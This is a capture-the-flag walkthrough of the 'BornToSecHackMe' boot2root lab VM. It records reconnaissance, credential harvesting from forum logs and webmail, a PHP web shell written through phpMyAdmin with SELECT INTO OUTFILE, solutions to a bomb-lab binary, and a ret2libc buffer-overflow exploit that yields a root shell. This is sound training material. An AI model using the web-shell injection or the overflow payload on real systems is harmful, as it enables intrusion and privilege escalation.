# The Project Route

---

# Part 1: Setup

In VirtualBox, go to **Settings** → **Network** → set **Attached to:** `Host-only Adapter`.

Start the virtual machine and retrieve the IP address from a terminal:

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ ifconfig
...
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1055  bytes 46766 (45.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Here, the IP is: **192.168.56.1**

Still in the terminal, we'll use **nmap** to scan all open ports on the network:

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ nmap 192.168.56.0/24
...
Nmap scan report for 192.168.56.101
Host is up (0.00068s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
...
```

We notice that on the address **192.168.56.101**, the ports HTTPS, HTTP, SSH, and FTP are open.

---

# Part 2: Forum

Since ports 80 and 443 are open, we can check if a website is running on the machine.

Which it is — we can access it via [http://192.168.56.101/](http://192.168.56.101/)

The home page doesn’t reveal much, so from a Kali Linux distribution, we use the command **dirb** to map the site and find potential routes.

We'll test both port 80 and 443.

**HTTP:**

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ dirb http://192.168.56.101 -r
...
DIRECTORY: http://192.168.56.101/fonts/
+ http://192.168.56.101/forum (CODE:403|SIZE:287)                           
+ http://192.168.56.101/index.html (CODE:200|SIZE:1025)                     
+ http://192.168.56.101/server-status (CODE:403|SIZE:295)                   
                                                                               
-----------------
END_TIME: Wed Jul 23 19:14:43 2025
DOWNLOADED: 4612 - FOUND: 4
```

**HTTPS:**

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ dirb https://192.168.56.101 -r
...                                                                       
DIRECTORY: https://192.168.56.101/forum/
DIRECTORY: https://192.168.56.101/phpmyadmin/
+ https://192.168.56.101/server-status (CODE:403|SIZE:296)
DIRECTORY: https://192.168.56.101/webmail/                                                                                       
                                                                                                                                     
-----------------
END_TIME: Wed Jul 23 19:15:53 2025
DOWNLOADED: 4612 - FOUND: 2
```

We discover that the website on port 443 hosts three services:

* forum
* phpMyAdmin
* webmail

We visit [https://192.168.56.101/forum](https://192.168.56.101/forum) in our browser and find a page titled **"Probleme login ?"** ("Login problem?").

This page contains many login logs. We search within it to find any password leakage.

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ curl -k https://192.168.56.101/forum/index.php?id=6 | grep "invalid"
...
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
...
```

We see that a password was mistakenly passed as a username. The actual user is **lmezard** (this can be found at the top of the page).

We log in as this user and find their email address in their profile: **[laurie@borntosec.net](mailto:laurie@borntosec.net)**

---

# Part 3: Mail

With the email address, we go to the webmail service: [https://192.168.56.101/webmail](https://192.168.56.101/webmail)

We use the email as the username and the previously recovered password to access the inbox.

There are two emails:

* DB access
* Very interesting !!!!

Only the first one is relevant. It contains the database login credentials:

* user: **root**
* password: **Fg-'kKXBj87E\:aJ\$**

---

# Part 4: PHPMyAdmin

We use these credentials to access: [https://192.168.56.101/phpmyadmin](https://192.168.56.101/phpmyadmin)

From PHPMyAdmin, we can perform an SQL injection to create a route that will allow us to execute commands on the server.

We run the following SQL command:

```sql
SELECT "<pre><?php system($_GET['cmd'])?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

After this command is executed, we can use the route `/forum/templates_c/shell.php?cmd=...` to extract data from the server.

From the browser, we run:
[https://192.168.56.101/forum/templates\_c/shell.php?cmd=find+/home](https://192.168.56.101/forum/templates_c/shell.php?cmd=find+/home)

Which gives us:

```
/home
/home/LOOKATME
/home/LOOKATME/password
/home/ft_root
/home/laurie
/home/laurie@borntosec.net
/home/lmezard
/home/thor
/home/zaz
```

Next, we run:
[https://192.168.56.101/forum/templates\_c/shell.php?cmd=cat](https://192.168.56.101/forum/templates_c/shell.php?cmd=cat) /home/LOOKATME/password

And we get:

```
lmezard:G!@M6f4Eatau{sF"
```

---

# Part 5: FTP

The user and password we just found allow us to access the FTP service.

We retrieve all the files using:

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7707|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> mget *
mget README [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||55507|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*****************************************************************************************|    96      131.30 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (39.02 KiB/s)
229 Entering Extended Passive Mode (|||18340|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*****************************************************************************************|   790 KiB   26.85 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (26.14 MiB/s)
```

We then run `file` on both downloaded objects:

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ file fun README           
fun:    POSIX tar archive (GNU)
README: ASCII text
```

We realize that `fun` is a tar archive, so we extract it:

```bash
tar -xf fun
```

Inside `fun`, we find a folder `ft_fun` containing several `.pcap` files with C code.

Our goal is to rebuild the program and run it using a script:

```bash
┌──(jdamoise㉿vbox)-[~/ft_fun]
touch pcap_compile.sh                                             
chmod 777 pcap_compile.sh 
./pcap_compile.sh 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit  
```

We get a password which we hash using SHA-256:

```bash
┌──(jdamoise㉿vbox)-[~/ft_fun]
└─$ echo -n Iheartpwnage | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

And we now have the password to connect as **laurie** via SSH to the machine.


---


# Part 6: Laurie

Now that we are connected to the user laurie, we will need to escalate users in order to become root

Here we are presented with a bomb lab challenge, when we execute the file we are prompted to defuse the bomb :


```bash
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```

We need to enter six different inputs to defuse the bomb and reconstitute the password, we will decompile the bomb to find the inputs to use.

---

## 🧩 Phase 1: String Matching

### Code Logic
```c
if (strings_not_equal(input, "Public speaking is very easy."))
    explode_bomb();
```

### Solution

```
Public speaking is very easy.
```

---

## 🧩 Phase 2: Arithmetic Pattern

### Code Logic

An array of 6 integers is read and checked:

* `v[0] == 1`
* `v[i] == v[i-1] * (i+1)` for `i` in 1..5

### Solution

```
1 2 6 24 120 720
```

---

## 🧩 Phase 3: Switch Case Check

### Code Logic

Parses: `<int> <char> <int>`
Validates a specific pair of character and number for each index (0–7).

### Example (Case 1)

```c
if (x == 1 && c == 'b' && y == 214)
```

### Solution

```
1 b 214
```

---

## 🧩 Phase 4: Recursive Function

### Code Logic

Calls a Fibonacci-like recursive function `func4(n)`:

```c
func4(n) = (n <= 1) ? 1 : func4(n-1) + func4(n-2)
```

Target: `func4(n) == 55`

### Solution

```
9
```

---

## 🧩 Phase 5: Bitmask + Lookup Table

### Code Logic

* Each character in the 6-character input is ANDed with `0xF` and used to index into:

```c
char array_123[16] = "isreawhobpnutfg"; // shuffled alphabet
```

* The result must spell `"giants"`.

### Solution

```
opekmq
```

(Masks to indices that map to `'g'`, `'i'`, `'a'`, `'n'`, `'t'`, `'s'`.)

---

## 🧩 Phase 6: Linked List Sorting

### Code Logic

* Input: 6 unique numbers in range 1–6.
* Used as indices to walk a linked list.
* The resulting list must be sorted in **strict descending order** based on node values.

### Solution

```
4 2 6 3 1 5
```

---

## ✅ Final Output

After solving every phase:

```
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

## 🏁 Full Input Script Example

```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```

## Assembling the password

Now we need to follow the README and assemble the password by combining the 6 strings without the spaces which gives us :

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

# Part 7 : Thor

In this user we are given a file named `turtle`, it's a list of instructions for the turtle software, we can use a python script to draw the result.

It gives us the word `SLASH` scrambled

Now we follow the hint and we digest it to obtain the password :

```
thor@BornToSecHackMe:~$ echo -n SLASH | md5sum
646da671ca01bb5d84dbb5fb2238dc8e  -
```

# Part 8 : Zaz

Here we are given a file to exploit `exploit_me`, by decompiling we can see it has a vulnerable user input so we will do a ret2libc.

## Calculate the offset

```bash
zaz@BornToSecHackMe:~$ gdb -q ./exploit_me 
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()

```

`0x37654136` gives us an offset of 140

## Find addresses

Next we find the addresses of the `system` and `exit` function, along with the `/bin/sh` string

```bash
zaz@BornToSecHackMe:~$ gdb -q ./exploit_me 
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/zaz/exploit_me 

Breakpoint 1, 0x080483f7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) i proc map
process 4544
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.

```

The address for system is `0xb7e6b060`, for exit it's `0xb7e5ebe0` and the address for /bin/sh is `0xb7f8cc58`

## Exploiting

Now we have all the elements necessary for a ret2libc so let's do it !

```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct;print(b"A"*140 + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0xb7e5ebe0) + struct.pack("<I",0xb7f8cc58))')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```


✅ **Beep Boop, We're root!**